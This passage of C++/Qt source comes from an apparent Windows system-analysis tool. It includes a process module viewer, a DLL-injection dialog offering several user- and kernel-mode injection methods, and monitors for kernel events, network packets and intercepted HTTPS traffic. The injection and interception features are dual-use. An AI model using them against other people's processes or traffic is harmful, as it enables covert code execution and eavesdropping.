        Dialog->setWindowTitle("PEB");
        Dialog->resize(850, 620);
        auto *Layout = new QVBoxLayout(Dialog);
        auto *Details = new PlainTextEdit;
        Details->setReadOnly(true);
        Details->setFont(QFont("Cascadia Mono", 10));
        Details->setPlainText(Utf8Text(Output));
        InstallFluentScrollBar(Details, Qt::Vertical);
        Layout->addWidget(Details);
        auto *CloseButton = MakeButton("Close", true);
        Layout->addWidget(CloseButton, 0, Qt::AlignRight);
        QObject::connect(CloseButton, &QPushButton::clicked, Dialog, &QDialog::accept);
        Dialog->show();
    }

    void ShowModuleList(DWORD Pid)
    {
        std::vector<ToolModuleInfo> Modules;
        if (!ProcessPeb::ReadModuleList(Pid, Modules))
        {
            ShowErrorNotice(this, "ModuleList", "Unable to enumerate target process modules.");
            return;
        }
        auto *Dialog = new QDialog(this);
        Dialog->setAttribute(Qt::WA_DeleteOnClose);
        Dialog->setWindowTitle(QString("ModuleList - PID %1").arg(Pid));
        Dialog->resize(1050, 650);
        auto *Layout = new QVBoxLayout(Dialog);
        auto *Toolbar = new QHBoxLayout;
        ConfigureToolbarLayout(Toolbar);
        auto *ModuleSearch = new SearchLineEdit;
        ModuleSearch->setPlaceholderText("Search module, address, size, or path");
        ModuleSearch->setClearButtonEnabled(true);
        ModuleSearch->setMaximumWidth(460);
        auto *ModuleCount = new BodyLabel(QString("%1 modules").arg(Modules.size()));
        Toolbar->addWidget(ModuleSearch, 1);
        Toolbar->addWidget(ModuleCount);
        Layout->addLayout(Toolbar);
        auto *Table = MakeTable({"Module", "Base address", "Image size", "Path"});
        Table->setSortingEnabled(true);
        Table->horizontalHeader()->setSectionResizeMode(0, QHeaderView::ResizeToContents);
        Table->horizontalHeader()->setSectionResizeMode(1, QHeaderView::ResizeToContents);
        Table->horizontalHeader()->setSectionResizeMode(2, QHeaderView::ResizeToContents);
        Table->horizontalHeader()->setSectionResizeMode(3, QHeaderView::Stretch);
        Table->setRowCount(static_cast<int>(Modules.size()));
        for (int Row = 0; Row < static_cast<int>(Modules.size()); ++Row)
        {
            const ToolModuleInfo &Module = Modules[Row];
            Table->setItem(Row, 0, new QTableWidgetItem(Utf8Text(Module.Name)));
            Table->setItem(Row, 1, new QTableWidgetItem(
                QString("0x%1").arg(Module.BaseAddress, sizeof(uintptr_t) * 2, 16, QLatin1Char('0')).toUpper()));
            Table->setItem(Row, 2, new QTableWidgetItem(
                QString("%1 bytes (0x%2)").arg(Module.SizeOfImage).arg(Module.SizeOfImage, 0, 16).toUpper()));
            Table->setItem(Row, 3, new QTableWidgetItem(Utf8Text(Module.FullPath)));
            Table->setRowHeight(Row, 38);
        }
        Layout->addWidget(Table, 1);
        QObject::connect(ModuleSearch, &QLineEdit::textChanged, Dialog,
                         [Table, ModuleCount](const QString &Text) {
            const QString Query = Text.trimmed();
            int VisibleCount = 0;
            for (int Row = 0; Row < Table->rowCount(); ++Row)
            {
                QString RowText;
                for (int Column = 0; Column < Table->columnCount(); ++Column)
                {
                    if (const QTableWidgetItem *Item = Table->item(Row, Column))
                        RowText += Item->text() + QLatin1Char(' ');
                }
                const bool Visible = Query.isEmpty() || RowText.contains(Query, Qt::CaseInsensitive);
                Table->setRowHidden(Row, !Visible);
                if (Visible)
                    ++VisibleCount;
            }
            ModuleCount->setText(Query.isEmpty()
                ? QString("%1 modules").arg(Table->rowCount())
                : QString("%1 of %2 modules").arg(VisibleCount).arg(Table->rowCount()));
        });
        auto *CloseButton = MakeButton("Close", true);
        Layout->addWidget(CloseButton, 0, Qt::AlignRight);
        QObject::connect(CloseButton, &QPushButton::clicked, Dialog, &QDialog::accept);
        Dialog->show();
    }

    void ShowInjectDllDialog(DWORD Pid)
    {
        auto *Dialog = new MessageBoxBase(window());
        Dialog->setAttribute(Qt::WA_DeleteOnClose);
        auto *Title = MakeLabel("InjectDLL", 18, KTextPrimary, QFont::DemiBold);
        auto *Description = MakeLabel(QString("Select a DLL and injection method for PID %1.").arg(Pid),
                                      11, KTextMuted);
        auto *PathLabel = MakeLabel("DLL path", 11, KTextPrimary, QFont::DemiBold);
        auto *PathLayout = new QHBoxLayout;
        auto *PathEdit = new LineEdit;
        PathEdit->setPlaceholderText("Select a DLL file");
        auto *BrowseButton = MakeButton("Browse");
        PathLayout->addWidget(PathEdit, 1);
        PathLayout->addWidget(BrowseButton);
        auto *MethodLabel = MakeLabel("Injection method", 11, KTextPrimary, QFont::DemiBold);
        auto *Method = new ComboBox;
        Method->addItems({"R3CreateRemoteThread", "R3NtCreateThreadEx", "R3QueueUserAPC",
                          "R3SetWindowsHookEx", "R0DllInjectApc", "R0DllInjectThread"});
        Method->setCurrentIndex(0);
        Dialog->viewLayout()->addWidget(Title);
        Dialog->viewLayout()->addWidget(Description);
        Dialog->viewLayout()->addSpacing(8);
        Dialog->viewLayout()->addWidget(PathLabel);
        Dialog->viewLayout()->addLayout(PathLayout);
        Dialog->viewLayout()->addWidget(MethodLabel);
        Dialog->viewLayout()->addWidget(Method);
        Dialog->yesButton()->setText("Inject");
        Dialog->cancelButton()->setText("Cancel");
        QObject::connect(BrowseButton, &QPushButton::clicked, Dialog, [Dialog, PathEdit] {
            const QString Path = QFileDialog::getOpenFileName(Dialog, "Select DLL", PathEdit->text(),
                                                               "DLL files (*.dll)");
            if (!Path.isEmpty())
                PathEdit->setText(QDir::toNativeSeparators(Path));
        });
        QObject::connect(Dialog->yesButton(), &QPushButton::clicked, Dialog,
                         [this, Dialog, PathEdit, Method, Pid] {
            const QString Path = PathEdit->text().trimmed();
            if (Path.isEmpty() || !QFileInfo::exists(Path))
            {
                ShowWarningNotice(this, "InjectDLL", "Select an existing DLL file.");
                return;
            }
            EnableDebugPrivilege();
            const std::wstring WidePath = QDir::toNativeSeparators(Path).toStdWString();
            BOOL Result = FALSE;
            switch (Method->currentIndex())
            {
            case 0: Result = Inject_RemoteThread(Pid, WidePath); break;
            case 1: Result = Inject_NtCreateThreadEx(Pid, WidePath); break;
            case 2: Result = Inject_QueueUserAPC(Pid, WidePath); break;
            case 3: Result = Inject_SetWindowsHookEx(Pid, WidePath); break;
            case 4: Result = DllInjectApc(Pid, WidePath.c_str()); break;
            case 5: Result = DllInjectThread(Pid, WidePath.c_str()); break;
            default: break;
            }
            Dialog->accept();
            if (!Result)
                ShowErrorNotice(this, "InjectDLL", "DLL injection failed. See Console for details.");
            else
                ShowSuccessNotice(this, "InjectDLL", "DLL injection started successfully.");
        });
        QObject::connect(Dialog->cancelButton(), &QPushButton::clicked, Dialog, &QDialog::reject);
        Dialog->show();
    }

    SearchLineEdit *SearchEdit = nullptr;
    BodyLabel *StatusLabel = nullptr;
    PushButton *RefreshButton = nullptr;
    TableWidget *ProcessTable = nullptr;
    std::vector<ProcessRow> Rows;
    std::map<DWORD, ProcessRow> RetainedProcesses;
    QSet<DWORD> ProtectedPids;
    std::atomic_bool Refreshing = false;

  protected:
    void showEvent(QShowEvent *Event) override
    {
        QWidget::showEvent(Event);
        RefreshProcesses();
    }
};

QWidget *CreateTaskPage()
{
    return new TaskManagerPage;
}

struct MonitorEventRow
{
    QString Text;
    QString Detail;
};

struct MonitorHistoryRow
{
    QString Timestamp;
    QString Type;
    DWORD Pid = 0;
    QString Process;
    QString Detail;
};

struct MonitorStreamState
{
    std::mutex Mutex;
    std::vector<MonitorEventRow> Rows;
    std::atomic_uint64_t Version = 0;
};

struct MonitorSharedState
{
    std::array<MonitorStreamState, 5> Streams;
    std::mutex HistoryMutex;
    std::vector<MonitorHistoryRow> HistoryRows;
    std::atomic_uint64_t HistoryVersion = 0;
};

std::weak_ptr<MonitorSharedState> G_ActiveMonitorState;

MonitorHistoryRow BuildMonitorHistoryRow(const QString &Text, const QString &Detail)
{
    MonitorHistoryRow Row;
    Row.Detail = Detail.isEmpty() ? Text : Detail;
    const QStringList Parts = Text.split(" | ");
    if (!Parts.isEmpty())
        Row.Timestamp = Parts[0].trimmed();
    if (Parts.size() > 1)
        Row.Type = Parts[1].trimmed();
    if (Parts.size() > 2)
        Row.Process = Parts[2].trimmed();
    static const QRegularExpression PidPattern(R"(\bPID\s+(\d+)\b)", QRegularExpression::CaseInsensitiveOption);
    const QRegularExpressionMatch Match = PidPattern.match(Text);
    if (Match.hasMatch())
        Row.Pid = Match.captured(1).toULong();
    if (Row.Process.isEmpty())
        Row.Process = Row.Pid ? QString("PID %1").arg(Row.Pid) : "-";
    if (Row.Type.isEmpty())
        Row.Type = "Event";
    if (Row.Timestamp.isEmpty())
        Row.Timestamp = QDateTime::currentDateTime().toString("yyyy-MM-dd HH:mm:ss.zzz");
    return Row;
}

void PushMonitorEvent(const std::shared_ptr<MonitorSharedState> &State, int StreamIndex,
                      QString Text, QString Detail = QString())
{
    if (!State || StreamIndex < 0 || StreamIndex >= static_cast<int>(State->Streams.size()))
        return;
    MonitorStreamState &Stream = State->Streams[StreamIndex];
    std::lock_guard<std::mutex> Lock(Stream.Mutex);
    Stream.Rows.insert(Stream.Rows.begin(), {std::move(Text), std::move(Detail)});
    if (Stream.Rows.size() > 500)
        Stream.Rows.resize(500);
    Stream.Version.fetch_add(1, std::memory_order_relaxed);
    if (StreamIndex < 4)
    {
        std::lock_guard<std::mutex> HistoryLock(State->HistoryMutex);
        State->HistoryRows.insert(State->HistoryRows.begin(), BuildMonitorHistoryRow(Stream.Rows.front().Text, Stream.Rows.front().Detail));
        if (State->HistoryRows.size() > 4000)
            State->HistoryRows.resize(4000);
        State->HistoryVersion.fetch_add(1, std::memory_order_relaxed);
    }
}

QString MonitorTimestamp(const FILETIME &Timestamp)
{
    return QString::fromStdWString(FormatTimestamp(Timestamp));
}

QString MonitorTimestamp(const LARGE_INTEGER &Timestamp)
{
    FILETIME FileTime{Timestamp.LowPart, static_cast<DWORD>(Timestamp.HighPart)};
    return MonitorTimestamp(FileTime);
}

QString NetworkAddressText(const uint32_t *Address, bool IsIpv6)
{
    char Text[INET6_ADDRSTRLEN]{};
    return InetNtopA(IsIpv6 ? AF_INET6 : AF_INET, Address, Text, sizeof(Text))
               ? QString::fromLatin1(Text)
               : "?";
}

void MonitorNetworkCallback(const NetMon_ParsedPacket *Packet)
{
    const std::shared_ptr<MonitorSharedState> State = G_ActiveMonitorState.lock();
    if (!State || !Packet)
        return;
    const QString Protocol = Packet->Protocol == IPPROTO_TCP ? "TCP" :
                             Packet->Protocol == IPPROTO_UDP ? "UDP" : "IP";
    const QString Local = NetworkAddressText(Packet->LocalAddr, Packet->IsIpv6);
    const QString Remote = NetworkAddressText(Packet->RemoteAddr, Packet->IsIpv6);
    const QString Process = Packet->ProcessName[0] ? QString::fromLatin1(Packet->ProcessName) : "<unknown>";
    const QString Text = QString("%1 | %2 | %3:%4 -> %5:%6 | %7 | PID %8 | %9 bytes")
                             .arg(Packet->Outbound ? "OUT" : "IN", Protocol, Local)
                             .arg(Packet->LocalPort).arg(Remote).arg(Packet->RemotePort)
                             .arg(Process).arg(Packet->Pid).arg(Packet->TotalLength);
    const std::string Hex = NetMon_Detail::PayloadToHex(
        Packet->Payload.empty() ? nullptr : Packet->Payload.data(), Packet->Payload.size());
    const std::string Ascii = NetMon_Detail::PayloadToAscii(
        Packet->Payload.empty() ? nullptr : Packet->Payload.data(), Packet->Payload.size());
    const QString Detail = Text + QString("\n\nPayload (%1 bytes)\n\nHEX:\n%2\n\nASCII:\n%3")
                                      .arg(Packet->Payload.size())
                                      .arg(QString::fromStdString(Hex), QString::fromStdString(Ascii));
    PushMonitorEvent(State, 2, Text, Detail);
}

class MonitorManagerPage final : public QWidget
{
  public:
    explicit MonitorManagerPage(QWidget *Parent = nullptr) : QWidget(Parent), SharedState(std::make_shared<MonitorSharedState>())
    {
        G_ActiveMonitorState = SharedState;
        auto *Layout = new QVBoxLayout(this);
        ConfigurePageLayout(Layout);
        auto *Tabs = new TabBar;
        Tabs->setAddButtonVisible(false);
        Tabs->setTabsClosable(false);
        Tabs->setMovable(false);
        Tabs->addTab("system", "System", Fluent::IconType::COMMAND_PROMPT);
        Tabs->addTab("process", "Process", Fluent::IconType::APPLICATION);
        Tabs->addTab("network", "Network", Fluent::IconType::GLOBE);
        Tabs->addTab("http", "HTTP(S)", Fluent::IconType::LINK);
        Tabs->addTab("history", "History", Fluent::IconType::HISTORY);
        Layout->addWidget(Tabs);
        Pages = new QStackedWidget;
        Pages->addWidget(CreateSystemPage());
        Pages->addWidget(CreateProcessPage());
        Pages->addWidget(CreateNetworkPage());
        Pages->addWidget(CreateHttpPage());
        Pages->addWidget(CreateHistoryPage());
        Layout->addWidget(Pages, 1);
        QObject::connect(Tabs, &TabBar::currentChanged, Pages, &QStackedWidget::setCurrentIndex);
        UpdateTimer = new QTimer(this);
        QObject::connect(UpdateTimer, &QTimer::timeout, this, [this] {
            if (!isVisible())
                return;
            const int Index = Pages->currentIndex();
            if (Index >= 0 && Index < 4)
            {
                const uint64_t Version = SharedState->Streams[Index].Version.load(std::memory_order_relaxed);
                if (DisplayedVersions[Index] != Version)
                {
                    DisplayedVersions[Index] = Version;
                    Populate(Index);
                }
            }
            else if (Index == 4)
            {
                const uint64_t Version = SharedState->HistoryVersion.load(std::memory_order_relaxed);
                if (DisplayedHistoryVersion != Version)
                {
                    DisplayedHistoryVersion = Version;
                    PopulateHistory(HistorySearchEdit ? HistorySearchEdit->text().trimmed() : QString());
                }
            }
        });
        QObject::connect(Pages, &QStackedWidget::currentChanged, this, [this](int Index) {
            if (Index >= 0 && Index < 4)
            {
                DisplayedVersions[Index] = SharedState->Streams[Index].Version.load(std::memory_order_relaxed);
                Populate(Index);
            }
            else if (Index == 4)
            {
                DisplayedHistoryVersion = SharedState->HistoryVersion.load(std::memory_order_relaxed);
                PopulateHistory(HistorySearchEdit ? HistorySearchEdit->text().trimmed() : QString());
            }
        });
        UpdateTimer->start(150);
    }

    ~MonitorManagerPage() override
    {
        StopHttp(false);
        StopNetwork(false);
        StopProcess(false);
        StopSystem(false);
        G_ActiveMonitorState.reset();
    }

  private:
    QWidget *CreateEventPage(int Index, QHBoxLayout *Controls, const QString &Placeholder)
    {
        auto *Page = new QWidget;
        auto *Layout = new QVBoxLayout(Page);
        Layout->setContentsMargins(0, 0, 0, 0);
        Layout->setSpacing(10);
        Layout->addLayout(Controls);
        auto *FilterLayout = new QHBoxLayout;
        Searches[Index] = new SearchLineEdit;
        Searches[Index]->setPlaceholderText(Placeholder);
        Searches[Index]->setClearButtonEnabled(true);
        auto *ClearButton = MakeButton("Clear");
        FilterLayout->addWidget(Searches[Index], 1);
        FilterLayout->addWidget(ClearButton);
        Layout->addLayout(FilterLayout);
        Tables[Index] = MakeTable({"Event"});
        Tables[Index]->setProperty("UseGenericDetailDialog", false);
        Tables[Index]->horizontalHeader()->setSectionResizeMode(0, QHeaderView::ResizeToContents);
        Tables[Index]->setContextMenuPolicy(Qt::CustomContextMenu);
        Layout->addWidget(Tables[Index], 1);
        QObject::connect(Searches[Index], &QLineEdit::textChanged, this, [this, Index] { Populate(Index); });
        QObject::connect(ClearButton, &QPushButton::clicked, this, [this, Index] { Clear(Index); });
        QObject::connect(Tables[Index], &QWidget::customContextMenuRequested, this,
                         [this, Index](const QPoint &Position) { ShowEventMenu(Index, Position); });
        QObject::connect(Tables[Index], &QTableWidget::cellDoubleClicked, this,
                         [this, Index](int Row, int) { ShowEventDetail(Index, Row); });
        return Page;
    }

    QWidget *CreateSystemPage()
    {
        auto *Controls = new QHBoxLayout;
        SystemMode = new ComboBox;
        SystemMode->addItems({"ETWMode", "KernelMode"});
        SystemMode->setCurrentIndex(0);
        SystemMode->setMinimumWidth(220);
        SystemFilterPid = new LineEdit;
        SystemFilterPid->setPlaceholderText("PID filter (0 = all)");
        SystemFilterPid->setMaximumWidth(150);
        SystemPathPrefix = new LineEdit;
        SystemPathPrefix->setPlaceholderText("Path prefix");
        RegistryPreview = new CheckBox("Registry preview");
        SystemStart = MakeButton("Start", true);
        SystemStop = MakeButton("Stop");
        SystemStop->setEnabled(false);
        Statuses[0] = new BodyLabel("Stopped");
        Controls->addWidget(SystemMode);
        Controls->addWidget(SystemFilterPid);
        Controls->addWidget(SystemPathPrefix, 1);
        Controls->addWidget(RegistryPreview);
        Controls->addWidget(SystemStart);
        Controls->addWidget(SystemStop);
        Controls->addWidget(Statuses[0], 1);
        QObject::connect(SystemStart, &QPushButton::clicked, this, [this] { StartSystem(); });
        QObject::connect(SystemStop, &QPushButton::clicked, this, [this] { StopSystem(true); });
        return CreateEventPage(0, Controls, "Search PID, TID, type, image, path, or registry key");
    }

    QWidget *CreateProcessPage()
    {
        auto *Controls = new QHBoxLayout;
        ProcessTarget = new LineEdit;
        ProcessTarget->setPlaceholderText("Process PID or name");
        ProcessMethod = new ComboBox;
        ProcessMethod->addItems({"R3CreateRemoteThread", "R3NtCreateThreadEx", "R3QueueUserAPC",
                                 "R3SetWindowsHookEx", "R0DllInjectApc", "R0DllInjectThread"});
        ProcessMethod->setCurrentIndex(0);
        ProcessStart = MakeButton("Start", true);
        ProcessStop = MakeButton("Stop");
        ProcessStop->setEnabled(false);
        Statuses[1] = new BodyLabel("Stopped");
        Controls->addWidget(ProcessTarget, 1);
        Controls->addWidget(ProcessMethod);
        Controls->addWidget(ProcessStart);
        Controls->addWidget(ProcessStop);
        Controls->addWidget(Statuses[1]);
        QObject::connect(ProcessStart, &QPushButton::clicked, this, [this] { StartProcess(); });
        QObject::connect(ProcessStop, &QPushButton::clicked, this, [this] { StopProcess(true); });
        return CreateEventPage(1, Controls, "Search category, PID, TID, or target");
    }

    QWidget *CreateNetworkPage()
    {
        auto *Controls = new QHBoxLayout;
        NetworkStart = MakeButton("Start", true);
        NetworkStop = MakeButton("Stop");
        NetworkStop->setEnabled(false);
        Statuses[2] = new BodyLabel("Stopped");
        Controls->addWidget(NetworkStart);
        Controls->addWidget(NetworkStop);
        Controls->addWidget(Statuses[2], 1);
        QObject::connect(NetworkStart, &QPushButton::clicked, this, [this] { StartNetwork(); });
        QObject::connect(NetworkStop, &QPushButton::clicked, this, [this] { StopNetwork(true); });
        return CreateEventPage(2, Controls, "Search process, PID, protocol, or address");
    }

    QWidget *CreateHttpPage()
    {
        auto *Controls = new QHBoxLayout;
        HttpProxyPort = new LineEdit;
        HttpProxyPort->setPlaceholderText("Proxy port");
        HttpProxyPort->setText("8443");
        HttpProxyPort->setMaximumWidth(110);
        HttpStart = MakeButton("Start", true);
        HttpStop = MakeButton("Stop");
        HttpStop->setEnabled(false);
        Statuses[3] = new BodyLabel("Stopped | HTTPS proxy 127.0.0.1:8443");
        Controls->addWidget(HttpProxyPort);
        Controls->addWidget(HttpStart);
        Controls->addWidget(HttpStop);
        Controls->addWidget(Statuses[3], 1);
        QObject::connect(HttpStart, &QPushButton::clicked, this, [this] { StartHttp(); });
        QObject::connect(HttpStop, &QPushButton::clicked, this, [this] { StopHttp(true); });
        return CreateEventPage(3, Controls, "Search URL, host, method, status, SNI, process, or PID");
    }

    QWidget *CreateHistoryPage()
    {
        auto *Page = new QWidget;
        auto *Layout = new QVBoxLayout(Page);
        Layout->setContentsMargins(0, 0, 0, 0);
        Layout->setSpacing(10);

        auto *CtrlBar = new QHBoxLayout;
        auto *ExportBtn = MakeButton("Export CSV");
        auto *ClearBtn = MakeButton("Clear");
        HistorySearchEdit = new SearchLineEdit;
        HistorySearchEdit->setPlaceholderText("Search events by type, PID, process, or detail");
        HistorySearchEdit->setClearButtonEnabled(true);
        HistorySearchEdit->setMaximumWidth(400);
        HistoryStatus = new BodyLabel("Persistent event history");
        CtrlBar->addWidget(HistorySearchEdit);
        CtrlBar->addStretch();
        CtrlBar->addWidget(ExportBtn);
        CtrlBar->addWidget(ClearBtn);
        CtrlBar->addWidget(HistoryStatus);
        Layout->addLayout(CtrlBar);

        HistoryTable = MakeTable({"Timestamp", "Type", "PID", "Process", "Detail"});
        HistoryTable->setProperty("DetailDialogTitle", "Event details");
        Layout->addWidget(HistoryTable, 1);

        QObject::connect(HistorySearchEdit, &QLineEdit::textChanged, this, [this] {
            PopulateHistory(HistorySearchEdit->text().trimmed());
        });
        QObject::connect(ExportBtn, &QPushButton::clicked, this, [this] {
            QString Path = QFileDialog::getSaveFileName(this, "Export Events", "events.csv", "CSV (*.csv)");
            if (!Path.isEmpty()) {
                QFile File(Path);
                if (File.open(QIODevice::WriteOnly | QIODevice::Text)) {
                    std::vector<MonitorHistoryRow> HistoryRows;
                    {
                        std::lock_guard<std::mutex> Lock(SharedState->HistoryMutex);
                        HistoryRows = SharedState->HistoryRows;
                    }
                    QTextStream Out(&File);
                    Out << "Timestamp,Type,PID,Process,Detail\n";
                    for (const auto &Evt : HistoryRows)
                        Out << Evt.Timestamp << "," << Evt.Type << "," << Evt.Pid << "," << Evt.Process << ",\"" << Evt.Detail << "\"\n";
                }
            }
        });
        QObject::connect(ClearBtn, &QPushButton::clicked, this, [this] {
            {
                std::lock_guard<std::mutex> Lock(SharedState->HistoryMutex);
                SharedState->HistoryRows.clear();
                SharedState->HistoryVersion.fetch_add(1, std::memory_order_relaxed);
            }
            PopulateHistory(QString());
        });

        return Page;
    }

    void Populate(int Index)
    {
        if (!Tables[Index])
            return;
        std::vector<MonitorEventRow> Rows;
        {
            std::lock_guard<std::mutex> Lock(SharedState->Streams[Index].Mutex);
            Rows = SharedState->Streams[Index].Rows;
        }
        const QString Query = Searches[Index]->text().trimmed();
        Tables[Index]->setUpdatesEnabled(false);
        Tables[Index]->clearContents();
        Tables[Index]->setRowCount(0);
        for (const MonitorEventRow &Event : Rows)
        {
            if (!Query.isEmpty() && !Event.Text.contains(Query, Qt::CaseInsensitive) &&
                !Event.Detail.contains(Query, Qt::CaseInsensitive))
                continue;
            const int Row = Tables[Index]->rowCount();
            Tables[Index]->insertRow(Row);
            auto *Item = new QTableWidgetItem(Event.Text);
            Item->setData(Qt::UserRole, Event.Detail);
            Tables[Index]->setItem(Row, 0, Item);
            Tables[Index]->setRowHeight(Row, 38);
        }
        Tables[Index]->setUpdatesEnabled(true);
    }

    void Clear(int Index)
    {
        MonitorStreamState &Stream = SharedState->Streams[Index];
        {
            std::lock_guard<std::mutex> Lock(Stream.Mutex);
            Stream.Rows.clear();
            Stream.Version.fetch_add(1, std::memory_order_relaxed);
        }
        Populate(Index);
    }

    void ShowEventMenu(int Index, const QPoint &Position)
    {
        const QModelIndex ModelIndex = Tables[Index]->indexAt(Position);
        if (!ModelIndex.isValid()) return;
        Tables[Index]->selectRow(ModelIndex.row());
        auto *Menu = new RoundMenu(QString(), this);
        auto *Copy = new QAction("Copy information", Menu);
        auto *Details = new QAction("Detailed information", Menu);
        Menu->addAction(Copy);
        Menu->addAction(Details);
        QObject::connect(Copy, &QAction::triggered, this, [this, Index, Row = ModelIndex.row()] {
            if (auto *Item = Tables[Index]->item(Row, 0))
            {
                QApplication::clipboard()->setText(Item->text());
                ShowSuccessNotice(this, "Monitor", "Event information copied.");
            }
        });
        QObject::connect(Details, &QAction::triggered, this,
                         [this, Index, Row = ModelIndex.row()] { ShowEventDetail(Index, Row); });
        ReleaseMenuAfterClose(Menu);
        Menu->exec(Tables[Index]->viewport()->mapToGlobal(Position));
    }

    void ShowEventDetail(int Index, int Row)
    {
        QTableWidgetItem *Item = Tables[Index]->item(Row, 0);
        if (!Item) return;
        QString Detail = Item->data(Qt::UserRole).toString();
        if (Detail.isEmpty()) Detail = Item->text();
        auto *Dialog = new QDialog(this);
        Dialog->setAttribute(Qt::WA_DeleteOnClose);
        Dialog->setWindowTitle("Monitor event details");
        Dialog->resize(900, 620);
        auto *Layout = new QVBoxLayout(Dialog);
        auto *Text = new PlainTextEdit;
        Text->setReadOnly(true);
        Text->setFont(QFont("Cascadia Mono", 10));
        Text->setPlainText(Detail);
        InstallFluentScrollBar(Text, Qt::Vertical);
        Layout->addWidget(Text, 1);
        auto *Close = MakeButton("Close", true);
        Layout->addWidget(Close, 0, Qt::AlignRight);
        QObject::connect(Close, &QPushButton::clicked, Dialog, &QDialog::accept);
        Dialog->show();
    }

    static QString FormatEtwEvent(const ParsedEvent &Event)
    {
        QString Text = QString("%1 | %2 | %3 | PID %4 | TID %5")
                           .arg(MonitorTimestamp(Event.TimeStamp),
                                QString::fromWCharArray(CategoryToString(Event.Category)),
                                Event.ProcessName.empty() ? "<unknown>" : QString::fromStdWString(Event.ProcessName))
                           .arg(Event.ProcessId).arg(Event.ThreadId);
        if (Event.ParentPid) Text += QString(" | PPID %1").arg(Event.ParentPid);
        if (Event.StartAddr) Text += QString(" | Start 0x%1").arg(Event.StartAddr, 0, 16).toUpper();
        if (!Event.ImageName.empty()) Text += " | Image " + QString::fromStdWString(Event.ImageName);
        if (!Event.FileName.empty()) Text += " | File " + QString::fromStdWString(Event.FileName);
        if (!Event.RegistryPath.empty()) Text += " | Key " + QString::fromStdWString(Event.RegistryPath);
        if (!Event.ValueName.empty()) Text += " | Value " + QString::fromStdWString(Event.ValueName);
        if (Event.DataSize) Text += QString(" | Size %1").arg(Event.DataSize);
        return Text;
    }

    static QString FormatKernelEvent(const MonitorEvent &Event)
    {
        const std::wstring ProcessName = GetProcessNameFromPid(Event.ProcessId);
        QString Text = QString("%1 | %2 | %3 | PID %4 | TID %5")
                           .arg(MonitorTimestamp(Event.TimeStamp),
                                QString::fromWCharArray(EventTypeToString(Event.Type)),
                                ProcessName.empty() ? "<unknown>" : QString::fromStdWString(ProcessName))
                           .arg(Event.ProcessId).arg(Event.ThreadId);
        if (Event.ParentPid) Text += QString(" | PPID %1").arg(Event.ParentPid);
        if (Event.Path[0]) Text += " | " + QString::fromWCharArray(Event.Path);
        if (Event.Extra[0]) Text += " | " + QString::fromWCharArray(Event.Extra);
        if (Event.Data1) Text += QString(" | Data1 %1 (0x%2)").arg(Event.Data1).arg(Event.Data1, 0, 16).toUpper();
        if (Event.Data2) Text += QString(" | Data2 %1 (0x%2)").arg(Event.Data2).arg(Event.Data2, 0, 16).toUpper();
        return Text;
    }

    static QString FormatKernelEventV2(const MonitorEventV2 &Event)
    {
        const std::wstring ProcessName = GetProcessNameFromPid(Event.ProcessId);
        QString Text = QString("%1 | #%2 | %3 | %4 | PID %5 | TID %6")
            .arg(MonitorTimestamp(Event.TimeStamp)).arg(Event.Sequence)
            .arg(QString::fromWCharArray(EventTypeToString(static_cast<MonitorEventType>(Event.Type))))
            .arg(ProcessName.empty() ? "<unknown>" : QString::fromStdWString(ProcessName))
            .arg(Event.ProcessId).arg(Event.ThreadId);
        if (Event.ParentPid) Text += QString(" | PPID %1").arg(Event.ParentPid);
        if (Event.TargetProcessId) Text += QString(" | Target PID %1").arg(Event.TargetProcessId);
        if (Event.TargetThreadId) Text += QString(" | Target TID %1").arg(Event.TargetThreadId);
        if (Event.Address) Text += QString(" | Address 0x%1").arg(Event.Address, 0, 16).toUpper();
        if (Event.SizeBytes) Text += QString(" | Size %1").arg(Event.SizeBytes);
        if (Event.Type == EventNetworkConnect || Event.Type == EventNetworkAccept)
            Text += QString(" | Protocol %1 | Local %2 | Remote %3")
                .arg(Event.Operation).arg(Event.Value1).arg(Event.Value2);
        if (Event.Path[0]) Text += " | " + QString::fromWCharArray(Event.Path);
        if (Event.Extra[0]) Text += " | " + QString::fromWCharArray(Event.Extra);
        if (Event.Status) Text += QString(" | Status 0x%1").arg(static_cast<quint32>(Event.Status), 8, 16, QLatin1Char('0')).toUpper();
        return Text;
    }

    void StartSystem()
    {
        if (SystemStopping || SystemRunning.exchange(true)) return;
        Clear(0);
        SystemMode->setEnabled(false); SystemStart->setEnabled(false); SystemStop->setEnabled(true);
        const std::weak_ptr<MonitorSharedState> WeakState = SharedState;
        if (SystemMode->currentIndex() == 0)
        {
            Statuses[0]->setText("Starting ETWMode...");
            SetEtwEventCallback([WeakState](const ParsedEvent &Event) {
                if (const auto State = WeakState.lock()) PushMonitorEvent(State, 0, FormatEtwEvent(Event));
            });
            QPointer<MonitorManagerPage> Page(this);
            EtwThread = std::thread([Page, WeakState] {
                if (StartKernelTrace())
                {
                    if (Page) QMetaObject::invokeMethod(Page, [Page] { if (Page) Page->Statuses[0]->setText("ETWMode running"); }, Qt::QueuedConnection);
                    OpenAndProcessTrace();
                }
                else if (const auto State = WeakState.lock())
                    PushMonitorEvent(State, 0, QString("ETW start failed: %1").arg(GetLastStartTraceStatus()));
                StopTrace(); SetEtwEventCallback(nullptr);
                if (Page) QMetaObject::invokeMethod(Page, [Page] { if (Page) Page->HandleSystemWorkerExit(); }, Qt::QueuedConnection);
            });
        }
        else
        {
            try
            {
                MonitorFilterV2 Filter{};
                Filter.EventMask = ~0ull;
                Filter.ProcessId = SystemFilterPid->text().trimmed().toUInt();
                const std::wstring Prefix = SystemPathPrefix->text().trimmed().toStdWString();
                if (!Prefix.empty()) wcsncpy_s(Filter.PathPrefix, Prefix.c_str(), _TRUNCATE);
                if (RegistryPreview->isChecked()) {
                    Filter.Flags |= MONITOR_FILTER_REGISTRY_PREVIEW;
                    Filter.RegistryPreviewBytes = 256;
                }
                MonitorDrvSetFilterV2(Filter);
                Kernel = std::make_unique<KernelMonitorV2>();
                Kernel->SetCallback([WeakState](const MonitorEventV2 &Event) {
                    if (const auto State = WeakState.lock()) PushMonitorEvent(State, 0, FormatKernelEventV2(Event));
                });
                if (!Kernel->Start()) throw std::runtime_error("Kernel monitor start failed");
                Statuses[0]->setText("KernelMode running");
            }
            catch (const std::exception &Error)
            {
                Kernel.reset(); SystemRunning = false; FinishSystemStop();
                ShowErrorNotice(this, "Monitor", QString::fromLocal8Bit(Error.what()));
            }
        }
        if (SystemRunning) ShowSuccessNotice(this, "Monitor", "System monitor started.");
    }

    void FinishSystemStop()
    {
        SystemRunning = false; SystemStopping = false; SystemMode->setEnabled(true); SystemStart->setEnabled(true); SystemStop->setEnabled(false);
